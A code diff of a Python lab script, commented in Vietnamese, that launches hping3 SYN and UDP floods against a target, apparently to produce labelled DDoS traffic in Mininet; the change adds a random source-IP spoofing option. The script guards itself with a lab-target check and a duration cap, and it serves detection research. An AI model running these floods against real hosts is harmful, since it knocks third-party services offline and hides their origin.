@@ -28,7 +28,7 @@ import sys
 from safety import assert_lab_target
 
 
-def run_syn(server, pps, duration, port):
+def run_syn(server, pps, duration, port, spoof=False):
     if shutil.which("hping3") is None:
         print("Chưa cài hping3. Cài: sudo apt-get install hping3")
         return 1
@@ -37,12 +37,12 @@ def run_syn(server, pps, duration, port):
     # 'timeout' chặn cứng thời lượng: hping3 -i uX thường chậm hơn danh
     # nghĩa, nếu dùng -c (số gói) thì tấn công kéo dài quá pha -> lệch nhãn.
     cmd = ["timeout", str(int(duration)), "hping3", "-S", "-p", str(port),
-           "-i", "u%d" % interval_us, server]
+           "-i", "u%d" % interval_us] + (["--rand-source"] if spoof else []) + [server]
     print("[attack:syn] rate~%d pps, %ds ->" % (pps, duration), " ".join(cmd))
     return subprocess.call(cmd, stdout=subprocess.DEVNULL)
 
 
-def run_udp_hping(server, mbps, duration, port, payload=1000):
+def run_udp_hping(server, mbps, duration, port, payload=1000, spoof=False):
     if shutil.which("hping3") is None:
         print("Chưa cài hping3. Cài: sudo apt-get install hping3")
         return 1
@@ -50,7 +50,8 @@ def run_udp_hping(server, mbps, duration, port, payload=1000):
     pps = max(1, int(mbps * 1e6 / 8 / (payload + 42)))
     interval_us = max(1, int(1_000_000 / pps))
     cmd = ["timeout", str(int(duration)), "hping3", "--udp", "-p", str(port),
-           "-d", str(payload), "-i", "u%d" % interval_us, server]
+           "-d", str(payload), "-i", "u%d" % interval_us] + \
+        (["--rand-source"] if spoof else []) + [server]
     print("[attack:udp] trần %dMbps (~%d pps), %ds ->" % (mbps, pps, duration),
           " ".join(cmd))
     return subprocess.call(cmd, stdout=subprocess.DEVNULL)
@@ -76,16 +77,21 @@ def main():
     ap.add_argument("--mbps", type=int, default=8, help="udp: Mbps trần")
     ap.add_argument("--port", type=int, default=80)
     ap.add_argument("--udp-tool", choices=["hping3", "iperf3"], default="hping3")
+    ap.add_argument("--spoof", action="store_true",
+                    help="giả mạo IP nguồn ngẫu nhiên (hping3 --rand-source). Chỉ "
+                         "dùng trong Mininet cô lập: phản hồi tới IP giả bị switch drop")
     args = ap.parse_args()
     assert_lab_target(args.server)
     if args.duration <= 0 or args.duration > 600:
         sys.exit("duration phải trong (0, 600] giây.")
 
     if args.type == "syn":
-        sys.exit(run_syn(args.server, args.pps, args.duration, args.port))
+        sys.exit(run_syn(args.server, args.pps, args.duration, args.port, args.spoof))
     else:
-        fn = run_udp_hping if args.udp_tool == "hping3" else run_udp
-        sys.exit(fn(args.server, args.mbps, args.duration, args.port))
+        if args.udp_tool == "hping3":
+            sys.exit(run_udp_hping(args.server, args.mbps, args.duration, args.port,
+                                   spoof=args.spoof))
+        sys.exit(run_udp(args.server, args.mbps, args.duration, args.port))
 
 
 if __name__ == "__main__":
